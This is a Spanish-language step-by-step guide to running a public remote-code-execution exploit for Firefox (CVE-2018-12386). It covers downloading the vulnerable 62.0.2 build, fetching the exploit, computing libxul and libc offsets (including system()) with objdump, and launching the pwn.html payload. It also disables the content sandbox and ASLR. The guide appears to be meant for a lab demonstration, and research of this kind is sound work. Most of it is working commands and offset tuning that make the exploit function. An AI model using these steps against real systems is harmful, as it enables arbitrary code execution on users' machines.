Firefox Sandboxed RCE Exploit (CVE-2018-12386)

## Descargar version de Firefox vulnerable

Este exploit funciona en versiones anteriores a Firefox 62.0.3 and Firefox ESR 60.2.2.

```bash
wget https://ftp.mozilla.org/pub/firefox/releases/62.0.2/linux-x86_64/en-US/firefox-62.0.2.tar.bz2
bzip2 -d firefox-62.0.2.tar.bz2
tar xvf firefox-62.0.2.tar
```

Desactiva la actualizaciones automáticas en Firefox.

## Descargar el exploit 

https://github.com/0xLyte/cve-2018-12386/tree/master

## Ajustar el exploit (offsets.js)

```js
var OFFSETS = {
    'libxul_math_max': 0x2d8db40, //`libxul.so` correcta para Firefox v62.0.2
    'libxul_got_memmove': 0x5c0b370, //`libxul.so` correcta para Firefox v62.0.2`
    'libxul_got_tolower': 0x5c0d968, //`libxul.so` correcta para Firefox v62.0.2
    'libc_tolower': 0x2c0f0, //Ajustar a la libreria `libc.so.6` del S.O
    'libc_system': 0x3f480, //Ajustar a la libreria `libc.so.6` del S.O
}
```

Guía sobre cómo encontrar los offsets necesarios para ajustar el exploit según la versión de Firefox y la versión de `libc` que estás utilizando. 

### Para `libxul.so` Offsets

**libxul_math_max**:
- Si estás usando Firefox 62.0.2, los offsets provistos en `exploit/offsets.js` deberían ser correctos.
- Para otras versiones, puedes utilizar la primitiva `addrof` para filtrar la dirección de la función JavaScript `Math.max`, encontrar la dirección base de `libxul.so` para la instancia de Firefox que estás explotando (usando `cat /proc/$(pidof firefox)/maps` por ejemplo) y restar los dos para obtener el offset de `libxul_math_max`.

**libxul_got_memmove & libxul_got_tolower**:
- Si estás usando Firefox 62.0.2, los offsets en `exploit/offsets.js` deberían ser correctos.
- Para otras versiones, puedes usar `objdump` para obtener los offsets directamente del archivo `libxul.so` buscando las referencias a `memmove@GLIBC` y `tolower@GLIBC`. Ejemplo de comandos y salida para `memmove` y `tolower` te dan directamente los offsets necesarios.

### Para `libc.so.6` Offsets

Los offsets de `libc.so.6` dependen completamente de la versión de `libc` que uses. Aquí te explico cómo encontrarlos:

**Ubicación de `libc.so.6`**:
- Utiliza el comando `ldd` en cualquier binario (como `/bin/ls`) para encontrar la ubicación de `libc.so.6`. Ejemplo: `ldd /bin/ls | grep libc.so.6 | cut -d' ' -f3`

**libc_tolower**:
- Con la ubicación de `libc.so.6`, utiliza `objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep tolower`

Resultado: 

```bash
buntu@admin:~/demo/cve-2018-12386/exploit$ 
objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep tolower 

000000000021a808 g DO .data 0000000000000008 (GLIBC_2.2.5) __ctype32_tolower 000000000003a3a0 g DF .text 0000000000000015 GLIBC_2.3 __ctype_tolower_loc 000000000003a110 g DF .text 0000000000000021 GLIBC_2.2.5 _tolower 000000000003a310 g DF .text 000000000000000f GLIBC_2.2.5 __tolower_l 000000000003a310 w DF .text 000000000000000f GLIBC_2.3 tolower_l 

000000000003a090 g DF .text 000000000000002d GLIBC_2.2.5 tolower 

000000000021a818 g DO .data 0000000000000008 (GLIBC_2.2.5) __ctype_tolower 
```

La función `tolower` se encuentra en `0x003a090`. (000000000003a090) 

**libc_system**:
-  Con la ubicación de `libc.so.6`, utiliza `objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system`

Resultado: 

```bash
ubuntu@admin:~/demo/cve-2018-12386/exploit$ 
objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system 

0000000000050d70 g DF .text 000000000000002d GLIBC_PRIVATE __libc_system 

0000000000050d70 w DF .text 000000000000002d GLIBC_2.2.5 system 

0000000000168fb0 g DF .text 0000000000000067 (GLIBC_2.2.5) svcerr_systemerr
```

La función `system` se encuentra en `0x0050d70`. (0000000000050d70)

```⚠️
Recuerda que cuando ves `000000000003a090`, puedes simplificarlo a `0x3a090` eliminando los ceros innecesarios al principio, pero manteniendo el prefijo `0x` para clarificar que el número está en hexadecimal.
```

Con estos comandos y métodos, puedes ajustar los offsets en el archivo `offsets.js` según la versión específica de Firefox y la versión de `libc` que estés utilizando, asegurando así la correcta ejecución del exploit. 

## Ejecutar el exploit 

```sh
MOZ_DISABLE_CONTENT_SANDBOX=1 /path/to/vulnerable/firefox /path/to/cve-2018-12386/exploit/pwn.html
```


---

#### Otros (Opcional)

También se recomienda deshabilitar ASLR (Address Space Layout Randomization) y otros mecanismos de seguridad, ya que estos mecanismos están diseñados para proteger el sistema contra los ataques de explotación. 

**Deshabilitar ASLR temporalmente**: 

Ejecutando el siguiente comando como root: `echo 0 > /proc/sys/kernel/randomize_va_space`